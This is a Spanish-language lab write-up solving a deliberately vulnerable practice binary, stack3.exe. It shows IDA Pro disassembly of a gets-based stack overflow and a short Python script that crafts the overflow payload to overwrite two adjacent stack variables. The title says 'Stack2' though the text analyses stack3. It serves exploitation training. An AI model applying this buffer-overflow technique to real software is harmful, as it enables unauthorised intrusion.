@@ -1,0 +1,69 @@
+Stack2 by k0ch // 4 junio 2016
+
+Entorno: Windows 7 32bits
+
+En este caso analicé el stack3.idb con IDA PRO 6.8. Es bastante parecido a stack2, con la diferencia de que tenemos que
+poner "Macho lo venci" en buffer para que nos imprima un mensaje cuando lo logramos. 
+
+
+.text:004012B5                 call    ___main
+.text:004012BA                 mov     [ebp+var_10], 0
+.text:004012C1                 lea     eax, [ebp+var_C]
+.text:004012C4                 mov     [esp+78h+var_6C], eax
+.text:004012C8                 lea     eax, [ebp+var_14]
+.text:004012CB                 mov     [esp+78h+var_70], eax
+.text:004012CF                 lea     eax, [ebp+Buffer]
+.text:004012D2                 mov     [esp+78h+var_74], eax
+.text:004012D6                 mov     [esp+78h+Format], offset Format ; "buf: %08x cookie: %08x cookie2: %08x\n"
+.text:004012DD                 call    _printf
+.text:004012E2                 lea     eax, [ebp+Buffer]
+.text:004012E5                 mov     [esp+78h+Format], eax ; Buffer
+.text:004012E8                 call    _gets
+.text:004012ED                 cmp     [ebp+var_14], 71727374h
+.text:004012F4                 jnz     short loc_40132A
+.text:004012F6                 cmp     [ebp+var_C], 1020005h
+.text:004012FD                 jnz     short loc_40132A
+.text:004012FF                 lea     eax, [ebp+var_10]
+.text:00401302                 inc     dword ptr [eax]
+.text:00401304                 lea     eax, [ebp+var_10]
+.text:00401307                 mov     [esp+78h+var_74], eax
+.text:0040130B                 mov     [esp+78h+Format], offset aFlagX ; "flag %x\n"
+.text:00401312                 call    _printf
+.text:00401317                 lea     eax, [ebp+Buffer] <-- Aquí se carga nuevamente buffer para ser impreso al final.
+							     Tenemos que asegurarnos que imprima "Macho lo venci"
+.text:0040131A                 mov     [esp+78h+var_74], eax
+.text:0040131E                 mov     [esp+78h+Format], offset aS ; "%s\n"
+.text:00401325                 call    _printf
+.text:0040132A
+.text:0040132A loc_40132A:                             ; CODE XREF: _main+64j
+.text:0040132A                                         ; _main+6Dj
+.text:0040132A                 mov     eax, 0
+.text:0040132F                 leave
+.text:00401330                 retn
+.text:00401330 _main           endp
+
+Para poder realizar esto agregamos "Macho lo vencí" al principio del "buffer". Voy a hacer una aclaración que a la
+mayoria seguramente no les cause problema, pero la comparación necesaria de "cookie2" contiene un null character. No
+se preocupen, ya que la función "gets", con la que obtienen StdIn, no corta con null, sino con un salto de linea. 
+
+El script resultante es este:
+
+//---------------------
+
+import os
+
+StdIn,StdOut = os.popen4(r".\stack3.exe")
+
+XploitString = "Macho lo venci"
+XploitString += "\x00" * (68 - len(XploitString)) + "tsrq" + "\x00" * 4 + "\x05\x00\x02\x01" + '\n'
+print XploitString
+
+StdIn.write(XploitString)
+StdIn.close()
+
+print StdOut.read()
+
+//---------------------
+
+SEE YOU SPACE COWBOY :)
+..k0ch
